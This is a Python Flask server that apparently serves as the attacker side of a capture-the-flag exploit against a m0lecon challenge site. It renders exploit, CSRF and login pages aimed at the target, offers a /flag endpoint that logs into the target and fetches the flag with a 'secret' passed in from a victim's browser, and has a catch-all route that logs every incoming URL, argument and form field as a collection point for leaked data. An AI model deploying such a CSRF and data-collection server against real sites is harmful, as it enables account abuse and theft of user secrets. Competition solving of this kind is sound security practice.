from flask import Flask, request, render_template
import requests
from flask_cors import cross_origin

app = Flask(__name__)

TARGET = "https://thoughts.challs.m0lecon.it/"

user = ""
password = ""

@app.route('/', methods=['GET'])
def index():
    return render_template('exploit.html', target=TARGET)

@app.route('/csrf', methods=['GET'])
def csrf():
    return render_template('csrf.html', target=TARGET)

@app.route('/login', methods=['GET'])
def login():
    return render_template('login.html', target=TARGET, user=user, password=password)

@app.route('/flag', methods=['GET'])
@cross_origin()
def flag():
    secret = request.args.get('secret')
    try:
        s = requests.Session()
        s.post(f'{TARGET}/login', data={'username': user, 'password': password}, verify=False)
        r = s.get(f'{TARGET}/flag?secret={secret}', verify=False)
        print(r.text)
        return r.text
    except Exception as e:
        print(e)
        return ""

@app.route('/<path:path>', methods=['GET'])
def x(path):
    print(request.url)
    print(request.args)
    print(request.form)
    return ""

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
